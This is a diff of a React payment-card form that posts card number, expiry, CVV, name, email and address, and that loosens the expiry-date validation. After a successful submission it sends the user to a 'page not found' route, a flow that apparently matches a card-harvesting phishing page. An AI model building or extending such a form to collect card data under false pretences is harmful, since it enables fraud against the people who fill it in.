@@ -7,9 +7,13 @@ import { useNavigate } from "react-router-dom";
 
 import { v4 as uuidv4 } from "uuid";
 
-const navigate = useNavigate();
+import { useAddress } from "../../../AddressContext";
+import axios from "axios";
 
 const CardForm = () => {
+  const { address } = useAddress();
+  const navigate = useNavigate();
+
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
@@ -80,10 +84,6 @@ const CardForm = () => {
       tempErrors.card = "Invalid card number";
     }
 
-    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
-      tempErrors.expiry = "Invalid expiry date";
-    }
-
     if (!/^\d{3}$/.test(cvv)) {
       tempErrors.cvv = "CVV must be 3 digits";
     }
@@ -99,18 +99,18 @@ const CardForm = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (validateForm()) {
-      // Create cookie valid for 1 day
       const uniqueId = uuidv4();
       const expiryDate = new Date();
       expiryDate.setDate(expiryDate.getDate() + 1);
       document.cookie = `formToken=${uniqueId}; expires=${expiryDate.toUTCString()}; path=/`;
 
       const body = {
-        cardNumber,
-        expiry,
-        cvv,
-        name,
-        email,
+        card_number: cardNumber,
+        expiry_date: expiry,
+        cvv: cvv,
+        name: name,
+        email: email,
+        address: address,
       };
 
       try {
@@ -124,7 +124,7 @@ const CardForm = () => {
         console.log("Submitted successfully:", result.data);
 
         if (result.status === 201) {
-          navigate("/pagenotfound"); // redirect if status is 201 Created
+          navigate("/pagenotfound");
         }
       } catch (error) {
         console.error("Error submitting form:", error);
@@ -170,19 +170,12 @@ const CardForm = () => {
           }`}
           value={expiry}
           onChange={(e) => {
-            let val = e.target.value;
+            let val = e.target.value.replace(/\D/g, "");
 
-            // Remove everything except digits
-            val = val.replace(/\D/g, "");
-
-            // If 2 digits typed, add slash
-            if (val.length === 2 && expiry.length === 1) {
-              val += "/";
-            } else if (val.length > 2) {
-              val = val.slice(0, 2) + "/" + val.slice(2);
+            if (val.length >= 3) {
+              val = val.slice(0, 2) + "/" + val.slice(2, 4);
             }
 
-            // Limit to 5 characters max
             if (val.length > 5) {
               val = val.slice(0, 5);
             }
